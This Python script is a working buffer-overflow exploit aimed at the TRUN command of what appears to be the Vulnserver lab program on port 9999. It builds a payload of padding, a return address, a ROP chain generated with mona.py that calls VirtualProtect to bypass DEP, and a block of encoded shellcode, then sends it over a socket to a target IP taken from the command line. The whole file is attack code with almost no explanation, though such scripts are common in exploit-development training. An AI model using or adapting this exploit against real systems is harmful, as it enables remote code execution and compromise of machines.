#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL =  b""
SHELL += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
SHELL += b"\x81\x76\x0e\xd1\x54\x96\x92\x83\xee\xfc\xe2\xf4"
SHELL += b"\x2d\xbc\x14\x92\xd1\x54\xf6\x1b\x34\x65\x56\xf6"
SHELL += b"\x5a\x04\xa6\x19\x83\x58\x1d\xc0\xc5\xdf\xe4\xba"
SHELL += b"\xde\xe3\xdc\xb4\xe0\xab\x3a\xae\xb0\x28\x94\xbe"
SHELL += b"\xf1\x95\x59\x9f\xd0\x93\x74\x60\x83\x03\x1d\xc0"
SHELL += b"\xc1\xdf\xdc\xae\x5a\x18\x87\xea\x32\x1c\x97\x43"
SHELL += b"\x80\xdf\xcf\xb2\xd0\x87\x1d\xdb\xc9\xb7\xac\xdb"
SHELL += b"\x5a\x60\x1d\x93\x07\x65\x69\x3e\x10\x9b\x9b\x93"
SHELL += b"\x16\x6c\x76\xe7\x27\x57\xeb\x6a\xea\x29\xb2\xe7"
SHELL += b"\x35\x0c\x1d\xca\xf5\x55\x45\xf4\x5a\x58\xdd\x19"
SHELL += b"\x89\x48\x97\x41\x5a\x50\x1d\x93\x01\xdd\xd2\xb6"
SHELL += b"\xf5\x0f\xcd\xf3\x88\x0e\xc7\x6d\x31\x0b\xc9\xc8"
SHELL += b"\x5a\x46\x7d\x1f\x8c\x3c\xa5\xa0\xd1\x54\xfe\xe5"
SHELL += b"\xa2\x66\xc9\xc6\xb9\x18\xe1\xb4\xd6\xab\x43\x2a"
SHELL += b"\x41\x55\x96\x92\xf8\x90\xc2\xc2\xb9\x7d\x16\xf9"
SHELL += b"\xd1\xab\x43\xc2\x81\x04\xc6\xd2\x81\x14\xc6\xfa"
SHELL += b"\x3b\x5b\x49\x72\x2e\x81\x01\xf8\xd4\x3c\x9c\x92"
SHELL += b"\xd3\x5b\xfe\x90\xd1\x4b\x06\x1b\x37\x3e\x86\xc4"
SHELL += b"\x86\x3c\x0f\x37\xa5\x35\x69\x47\x54\x94\xe2\x9e"
SHELL += b"\x2e\x1a\x9e\xe7\x3d\x3c\x66\x27\x73\x02\x69\x47"
SHELL += b"\xb9\x37\xfb\xf6\xd1\xdd\x75\xc5\x86\x03\xa7\x64"
SHELL += b"\xbb\x46\xcf\xc4\x33\xa9\xf0\x55\x95\x70\xaa\x93"
SHELL += b"\xd0\xd9\xd2\xb6\xc1\x92\x96\xd6\x85\x04\xc0\xc4"
SHELL += b"\x87\x12\xc0\xdc\x87\x02\xc5\xc4\xb9\x2d\x5a\xad"
SHELL += b"\x57\xab\x43\x1b\x31\x1a\xc0\xd4\x2e\x64\xfe\x9a"
SHELL += b"\x56\x49\xf6\x6d\x04\xef\x76\x8f\xfb\x5e\xfe\x34"
SHELL += b"\x44\xe9\x0b\x6d\x04\x68\x90\xee\xdb\xd4\x6d\x72"
SHELL += b"\xa4\x51\x2d\xd5\xc2\x26\xf9\xf8\xd1\x07\x69\x47"

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x7699cfcf,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x77083491,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,8007007F # RETN 0x18 [KERNELBASE.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x770988dc,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x625014e6,  # & jmp esp [essfunc.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x77508b1d,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x7692da18,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x769a80d2,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x7707f452,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76d39914,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
        0x7743a4b2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x7678816a,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
        0x765e3bf2,  # &Writable location [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x7747e114,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x765a77c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x77095618,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x76f8af08,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # RETN
    struct.pack('<L', 0x62501029) +
    create_rop_chain() +
    SHELL + 
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)